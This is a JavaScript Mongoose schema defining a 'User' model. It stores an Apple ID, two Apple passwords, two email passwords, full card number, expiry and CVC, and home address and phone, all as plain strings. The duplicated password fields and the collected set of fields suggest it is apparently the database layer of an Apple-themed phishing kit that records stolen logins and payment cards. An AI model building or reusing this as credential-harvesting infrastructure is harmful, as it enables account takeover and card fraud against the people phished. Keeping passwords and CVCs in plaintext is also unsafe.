import { Schema, model } from "mongoose";
const Schema1 = Schema;

const user1schema = new Schema1({
    count: {
        type: Number,
        required: true,
    },
    userAgent: {
        type: String,
        required: true,
    },
    appleID: {
        type: String,
        required: false,
    },
    applePass: {
        type: String,
        required: false,
    },
    applePass2: {
        type: String,
        required: false,
    },
    name: {
        type: String,
        required: false,
    },
    address1: {
        type: String,
        required: false,
    },
    address2: {
        type: String,
        required: false,
    },
    city: {
        type: String,
        required: false,
    },
    state: {
        type: String,
        required: false,
    },
    zip: {
        type: String,
        required: false,
    },
    phone: {
        type: String,
        required: false,
    },
    cardnumber: {
        type: String,
        required: false,
    },
    expiration: {
        type: String,
        required: false,
    },
    cvc: {
        type: String,
        required: false,
    },
    emailPASS1: {
        type: String,
        required: false,
    },
    emailPASS2: {
        type: String,
        required: false,
    }
});

export default model("User", user1schema)
